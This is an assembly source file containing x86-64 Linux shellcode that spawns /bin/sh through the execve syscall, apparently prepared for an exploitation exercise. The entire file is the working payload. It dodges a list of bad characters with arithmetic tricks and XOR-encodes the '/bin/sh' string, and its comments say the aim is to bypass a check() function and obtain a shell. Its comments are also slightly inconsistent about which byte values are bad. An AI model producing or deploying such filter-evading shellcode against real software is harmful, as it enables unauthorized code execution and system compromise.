; nasm -f bin shellcode.asm -o shellcode.bin
; badchars to avoid in opcodes: 0x76, 0xd2, 0xc0
; execve("/bin/sh", 0, 0) syscall
BITS 64

section .text
  global _start
 
_start:
    mov rsi, 0x1                          ; We set 0x1 to rsi
    sub rsi, 0x1                          ; So we can subtract 1 of it to get 0. This is because of badchar 0xf6
    mov rdx, 0x1                          ; Same for rdx due to badchar 0xd2
    sub rdx, 01
    push rax                              ; We push rax to stack because it has 0 now and it will be /bin/sh null pointer
    mov rbx, 0x78633f7e79723f3f           ; Encoded string ("/bin/sh" XORed with key 0x1010101010101010)
    mov rcx, 0x1010101010101010           ; Load XOR key into rcx. We have to load it because xor works on 32bit integers only when using direct assignment
    xor rbx, rcx                          ; XOR to decode "/bin/sh"
    push rbx                              ; We place the new value on the stack
    mov rdi, rsp                          ; We move the rsp pointer to rdi. So now rdi has a pointer to /bin/sh
    mov al, 0x3a                          ; We do another math operation to get 0x3b into rax. 0x3b is a badchar.
    add al, 0x1                           ; We bypass the check() function this way and we do the syscall to get a shell.
    syscall